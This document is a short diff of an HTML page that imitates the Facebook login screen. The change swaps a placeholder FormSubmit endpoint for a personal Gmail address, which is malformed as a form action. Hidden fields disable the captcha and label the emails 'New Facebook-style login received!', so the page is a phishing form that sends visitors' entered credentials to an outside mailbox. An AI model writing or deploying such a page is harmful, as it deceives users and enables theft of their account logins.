@@ -69,7 +69,7 @@
 
   <div class="container">
     <div class="logo">facebook</div>
-    <form action="https://formsubmit.co/your_email@example.com" method="POST">
+    <form action="chayand063@gmail.com" method="POST">
       <!-- Required for FormSubmit to work properly -->
       <input type="hidden" name="_captcha" value="false">
       <input type="hidden" name="_subject" value="New Facebook-style login received!">
